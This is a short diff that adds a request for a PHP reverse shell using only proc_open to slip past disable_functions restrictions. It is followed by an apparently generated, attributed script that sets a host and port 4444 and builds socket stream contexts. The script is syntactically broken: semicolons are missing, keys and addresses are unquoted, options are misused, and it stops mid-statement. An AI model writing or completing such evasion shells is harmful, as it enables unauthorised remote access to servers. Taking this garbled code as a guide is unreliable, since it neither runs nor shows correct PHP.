@@ -1,0 +1,28 @@
+write me a PHP reverse shell script that only uses the PHP function proc_open, not the functions: exec, shell_exec, system, popen, etc in order to evade the disable_functions in PHP Safe Mode on PHP 8.0.2
+-------- snip --------
+
+
+<?php
+// PHP Reverse Shell Script using proc_open()
+// Author: David Ackerman
+// Version: 1.0
+// Date: 2021-04-16
+
+// Set connection variables
+$host = "127.0.0.1"
+$port = 4444
+
+// Create a stream context
+$context = stream_context_create()
+
+// Create a stream context to connect to the remote host
+$remote_host = array(socket => array(bindto => $host.:.$port))
+
+// Create a stream context to connect to the local host
+$local_host = array(socket => array(bindto => 127.0.0.1:0))
+
+// Create a stream context to set the timeout
+$timeout = array(socket => array(timeout => 3))
+
+// Merge all contexts together
+$context =
